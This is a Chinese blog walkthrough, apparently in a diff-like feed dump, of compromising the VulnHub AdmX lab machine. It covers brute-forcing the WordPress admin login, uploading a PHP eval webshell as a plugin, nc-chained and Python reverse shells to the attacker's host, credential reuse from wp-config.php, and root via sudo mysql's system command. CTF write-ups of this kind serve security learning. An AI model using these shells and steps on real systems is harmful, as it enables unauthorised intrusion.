-<li>填坑系列（四）启动，总体难度不大，主要是卡在 WordPress 那（这篇原文放在自己语雀了，所以下述时间会不对上）。</li>
-<li>靶机地址：<a href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></li>
-<li>Vulnhub 的靶机都有一个特点，通常导入到 VMware Workstation 时都会获取不到 IP 地址，虽然可以进紧急模式中修改，但是太麻烦了，还是将 Kali 和靶机桥接吧。</li>
-</ul>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ul>
-<li>由于将 Kali 与 VulnHub 使用 Virtual Box 仅主机网卡进行了桥接，所以使用 Kali 去扫描靶机。</li>
-<li>首先查看 Kali IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.56.105  netmask 255.255.255.0  broadcast 192.168.56.255</span><br><span class="line">        inet6 fe80::adc5:106b:ff3c:9390  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a8:8a:0b  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 24  bytes 10921 (10.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 549  bytes 40698 (39.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描当前网段，发现靶机 IP 地址：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan 192.168.56.0/24</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:a8:8a:0b, IPv4: 192.168.56.105</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:1a       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:d7:55:29       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.109  00:0c:29:23:07:8b       VMware, Inc.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.940 seconds (131.96 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>继续使用 Nmap 扫描端口、开放服务等信息：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p- 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:42 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00038s latency).</span><br><span class="line">Not shown: 65534 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 117.67 seconds</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nmap -p 80 -sV 192.168.56.109</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-08 01:44 EST</span><br><span class="line">Nmap scan report for 192.168.56.109</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">MAC Address: 00:0C:29:23:07:8B (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>扫描出 8080 端口的 Web 服务，通常情况下不考虑 SSH 爆破，访问一下 Web 服务：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234931326.png" alt="image-20230830234931326"></p>
-<h1 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h1><ul>
-<li>一个十分正常的 Apache 默认页面，使用 dirb 扫描一下站点目录：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.56.109/</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830234958769.png" alt="image-20230830234958769"></p>
-<ul>
-<li><p>发现一个 WordPress 目录，说明目标可能是由 WordPress 框架搭建的 Web 服务，代理挂到 BurpSuite 上进行查看：</p>
-<ul>
-<li>注：此处网卡出现问题，网卡连接至 NAT，地址为：192.168.1.139。</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.139/ -p 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235030368.png" alt="image-20230830235030368"></p>
-<ul>
-<li>经过上述操作，发现访问 WordPress 目录时都是 3xx 的页面跳转行为：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235044724.png" alt="image-20230830235044724"></p>
-<h1 id="BurpSuite-匹配替换"><a href="#BurpSuite-匹配替换" class="headerlink" title="BurpSuite 匹配替换"></a>BurpSuite 匹配替换</h1><ul>
-<li>通过仔细查找，发现页面上还会去加载另一个 IP 地址资源，当访问 WordPress 页面是，会出现 <code>Connecting to 192.168.159.145</code>，说明是硬编码写入到页面中：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235104825.png" alt="image-20230830235104825"></p>
-<ul>
-<li><p>由于页面资源访问不到，查看后明显是本地资源，就是 IP 地址不对。</p>
-</li>
-<li><p>这里有两种解决方式：</p>
-<ul>
-<li>修改靶机 IP 网段（太浪费时间了）</li>
-<li>使用 BurpSuite 进行 IP 地址替换</li>
-</ul>
-</li>
-<li><p>依次点击 BurpSuite 中的：</p>
-<ul>
-<li><p>Proxy</p>
-</li>
-<li><p>Options</p>
-</li>
-<li><p>找到 Match and Replace（匹配和替换）</p>
-</li>
-<li><p>点击 Add（两条，一条 Body，一条 Header）</p>
-<ul>
-<li>Type：Response body 、Response header</li>
-<li>Match：192.168.159.145</li>
-<li>Replace：192.168.1.139</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235122289.png" alt="image-20230830235122289"></p>
-<ul>
-<li>添加完后，刷新页面即可，页面访问正常（后续操作 BurpSuite 不要关）：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235131640.png" alt="image-20230830235131640"></p>
-<h1 id="框架扫描"><a href="#框架扫描" class="headerlink" title="框架扫描"></a>框架扫描</h1><ul>
-<li>既然已经知道目标站点是 WordPress，使用 WpScan 扫一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://192.168.1.139/wordpress --proxy http://127.0.0.1:8080 --enumerate</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235147367.png" alt="image-20230830235147367"></p>
-<ul>
-<li>发现存在用户 admin，根据前面目录扫描结果发现了管理员登录页面：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-admin</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235202041.png" alt="image-20230830235202041"></p>
-<ul>
-<li>当使用 admin 账号进行测试时，也证实了 admin 账户的存在：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235217563.png" alt="image-20230830235217563"></p>
-<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><ul>
-<li>使用 wpscan 进行暴力破解，前提需要先找到个好字典，这里使用 Kali 自带的 rockyou.txt：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解压一下</span></span><br><span class="line">cd /usr/share/wordlist</span><br><span class="line">gzip -d rockyou.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开始破解</span></span><br><span class="line">wpscan --url http://192.168.1.139/wordpress -U admin -P rockyou.txt --proxy http://127.0.0.1:8080</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235232661.png" alt="image-20230830235232661"></p>
-<ul>
-<li>经过了漫长的等待，破解出密码：<code>admin/adam14</code>，成功进入后台：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235247619.png" alt="image-20230830235247619"></p>
-<ul>
-<li>为了查看方便，将其修改为中文：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235255665.png" alt="image-20230830235255665"></p>
-<h1 id="插件传马"><a href="#插件传马" class="headerlink" title="插件传马"></a>插件传马</h1><ul>
-<li><p>通常对于 wp 后台有以下几种利用方式：</p>
-<ul>
-<li>文件上传（只针对特定 wp 版本）</li>
-<li>模板注入（无法修改页面）</li>
-<li>插件上传</li>
-</ul>
-</li>
-<li><p>现在本地编写 wp 插件：</p>
-<ul>
-<li>编写格式：<a href="https://www.wpdaxue.com/writing_a_plugin.html">https://www.wpdaxue.com/writing_a_plugin.html</a></li>
-</ul>
-</li>
-</ul>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">Description: WP WebShell</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author: yonzg</span></span><br><span class="line"><span class="comment">Author URI: https://yongz.github.io</span></span><br><span class="line"><span class="comment">License: https://yongz.github.io</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235315340.png" alt="image-20230830235315340"></p>
-<ul>
-<li>由于 wp 接收插件是 zip 格式，需要进行压缩：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/tmp]</span><br><span class="line">└─# zip shell.zip shell.php</span><br><span class="line">  adding: shell.php (deflated 38%)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>进行插件上传：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235338061.png" alt="image-20230830235338061"></p>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235340626.png" alt="image-20230830235340626"></p>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235350015.png" alt="image-20230830235350015"></p>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235354655.png" alt="image-20230830235354655"></p>
-<ul>
-<li>插件已被启用，上传之后的访问地址为：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>尝试是否能够进行命令执行：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://192.168.1.139/wordpress/wp-content/plugins/shell.php?cmd=phpinfo();</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235417158.png" alt="image-20230830235417158"></p>
-<ul>
-<li>命令执行成功~，使用蚁剑进行连接（蚁剑安装过程略）：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235426740.png" alt="image-20230830235426740"></p>
-<ul>
-<li>连接成功！查找 flag 文件，在 <code>/home/wpadmin</code> 目录下找到了，但是权限不够，需要提权。</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235443152.png" alt="image-20230830235443152"></p>
-<h1 id="MSF-Shell-反弹"><a href="#MSF-Shell-反弹" class="headerlink" title="MSF Shell 反弹"></a>MSF Shell 反弹</h1><ul>
-<li>同理，使用 MSF 进行 Shell 反弹：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">search wp shell</span><br><span class="line">use 9</span><br><span class="line">set PASSWORD adam14</span><br><span class="line">set RHOSTS 192.168.1.139</span><br><span class="line">set TARGETURI /wordpress</span><br><span class="line">set USERNAME admin</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235506399.png" alt="image-20230830235506399"></p>
-<ul>
-<li>可以看出，也是使用插件上传的方式获取 Shell。</li>
-</ul>
-<h1 id="NC-Shell-反弹"><a href="#NC-Shell-反弹" class="headerlink" title="NC Shell 反弹"></a>NC Shell 反弹</h1><ul>
-<li><p>通过提权三部曲：</p>
-<ul>
-<li>内核提权（Linux wp 5.4.0-72-generic #80-Ubuntu SMP Mon Apr 12 17:35:00 UTC 2021 x86_64 x86_64 x86_64 GNU&#x2F;Linux 内核版本过高）</li>
-<li>Sudo 提权（需要密码）</li>
-<li>SUID 提权（没有符合的文件）</li>
-</ul>
-</li>
-<li><p>那就只能接着去信息收集了，由于是 WP 框架，很有可能是 LAMP 环境，去翻翻配置文件：</p>
-</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /var/www/html/wordpress/wp-config.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235525893.png" alt="image-20230830235525893"></p>
-<ul>
-<li>发现了数据库的账号密码：<code>admin/Wp_Admin#123</code>，登录一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uadmin -pWp_Admin#123</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>结果发现，没啥用，蚁剑反弹的 Shell 没有回显。</li>
-<li>查看一下靶机是否安装有 NC：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235543037.png" alt="image-20230830235543037"></p>
-<ul>
-<li>发现存在 NC，但是是不带 -e 的版本。用 NC 串联反弹一个 Shell 回来：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 Kali 上开启两个 nc 监听</span></span><br><span class="line">nc -lvvp 4444</span><br><span class="line">nc -lvvp 5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在蚁剑上输入如下命令</span></span><br><span class="line">nc 192.168.1.136 4444 | /bin/bash | nc 192.168.1.136 5555</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235555924.png" alt="image-20230830235555924"></p>
-<h1 id="Python-Shell-反弹"><a href="#Python-Shell-反弹" class="headerlink" title="Python Shell 反弹"></a>Python Shell 反弹</h1><ul>
-<li>反弹成功！但是也不能进行回显，改用 Python 反弹，编写脚本 1.py：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((<span class="string">&quot;192.168.1.136&quot;</span>,<span class="number">4444</span>));</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>);</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>);</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235611950.png" alt="image-20230830235611950"></p>
-<ul>
-<li>反弹成功！并且可以进行交互，但是还是无法正常登陆 MySQL：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235620492.png" alt="image-20230830235620492"></p>
-<h1 id="Shell-升级"><a href="#Shell-升级" class="headerlink" title="Shell 升级"></a>Shell 升级</h1><ul>
-<li>此处需要升级一下 Shell：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看一下 Kali 与 靶机 的当前 Shell</span></span><br><span class="line">echo $0</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# echo $0</span><br><span class="line">/usr/bin/zsh</span><br><span class="line"></span><br><span class="line">www-data@wp:/var/www/html/wordpress$ echo $0</span><br><span class="line">echo $0</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现两者 Shell 环境不一致</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>开启升级操作：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1. 修改 Kali Shell 环境为 bash</span></span><br><span class="line">chsh -s /bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 修改后重启</span></span><br><span class="line">reboot</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 再次连接到 Python Shell，此处过程略</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4. 连接 Shell 后使用 Ctrl + Z 将 Shell 挂起</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5. Shell 挂起后输入如下命令改变本地终端设置，禁用 <span class="built_in">echo</span>，关闭输入输出</span></span><br><span class="line">stty raw -echo </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6. 使用 <span class="built_in">fg</span> 将刚才挂起的 Shell 调用到前台（此处 <span class="built_in">fg</span> 命令在终端是不显示的）</span></span><br><span class="line">fg</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7. 使用 <span class="built_in">export</span> 设置靶机终端的 Shell 环境变量</span></span><br><span class="line">export SHELL=/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8. 使用 <span class="built_in">export</span> 进行清屏设置</span></span><br><span class="line">export TERM=screen</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9. 修改靶机终端大小</span></span><br><span class="line">stty rows 38 columns 126</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10. 重启靶机终端</span></span><br><span class="line">reset</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>但是，这种方法不知道为什么，不能用，绝了。</li>
-</ul>
-<h1 id="数据库查找"><a href="#数据库查找" class="headerlink" title="数据库查找"></a>数据库查找</h1><ul>
-<li>但是的但是，经过我的多次尝试，在没回显的情况下，进入数据库在退出还是会有一定的回显：</li>
-</ul>
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235654720.png" alt="image-20230830235654720"></p>
-<ul>
-<li>意外之喜，经过多轮尝试，得到信息如下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show databases;</span></span><br><span class="line"></span><br><span class="line">Database</span><br><span class="line">information_schema</span><br><span class="line">wordpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">show tables;</span></span><br><span class="line"></span><br><span class="line">Tables_in_wordpress</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_comments</span><br><span class="line">wp_links</span><br><span class="line">wp_options</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_users</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="keyword">select</span> * from wp_users;</span></span><br><span class="line">ID      user_login      user_pass       user_nicename   user_email      user_url        user_registered user_activation_key     user_status     display_name</span><br><span class="line">1       admin   $P$B1sw76mAze9nXcsYokmVjZ2y0zrTAR1      admin   admin@wordpress.org     http://192.168.159.145/wordpress        2021-05-11 07:30:47             0       admin</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>淦，没卵用，目前已知的密码就俩：adam14、Wp_Admin#123。</li>
-</ul>
-<h1 id="密码复用"><a href="#密码复用" class="headerlink" title="密码复用"></a>密码复用</h1><ul>
-<li>看看密码能不能复用了，查看一下当前靶机的所有用户：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">......</span><br><span class="line">wpadmin:x:1001:1001::/home/wpadmin:/bin/bash</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>那就用上面两个密码，切换一下用户：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su wpadmin</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://yongz-typro.oss-cn-beijing.aliyuncs.com/img/image-20230830235749048.png" alt="image-20230830235749048"></p>
-<ul>
-<li>结果还真是，查看之前没权限查看的文件：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat local.txt</span><br><span class="line">153495edec1b606c24947b1335998bd9</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>得到第一个 <code>flag：153495edec1b606c24947b1335998bd9</code>。</li>
-</ul>
-<h1 id="SUDO-提权"><a href="#SUDO-提权" class="headerlink" title="SUDO 提权"></a>SUDO 提权</h1><ul>
-<li>用于不是 root 账户，决定再次提权，之前 sudo 密码，现有了：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo -l</span></span><br><span class="line">Matching Defaults entries for wpadmin on wp:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User wpadmin may run the following commands on wp:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>可以看到在不需要密码的情况下执行 <code>/usr/bin/mysql -u root -D wordpress -p</code> 命令获得的是 root 权限（但其实还是需要密码）。</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入如下命令，密码随便输</span></span><br><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在 MySQL 5.x 中增加了 system 命令（Linux），简单的符号是 !，从而使 MySQL 可以执行系统的命令，尝试一下：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system id; # uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>发现可以执行，那就直接切换 Shell：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">system /bin/bash;</span><br><span class="line">id # uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cd /root</span><br><span class="line">ls # proof.txt snap</span><br><span class="line">cat proof.txt # 7efd721c8bfff2937c66235f2d0dbac1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>找到第二个 <code>flag：7efd721c8bfff2937c66235f2d0dbac1</code>。</li>
-</ul>
-<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
-<li>目录扫描容易把 Web 服务扫崩。</li>
-<li>Shell 升级命令解析：<a href="https://blog.csdn.net/weixin_46622976/article/details/124446922">https://blog.csdn.net/weixin_46622976&#x2F;article&#x2F;details&#x2F;124446922</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>Vulnhub</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
       </tags>
   </entry>
 </search>
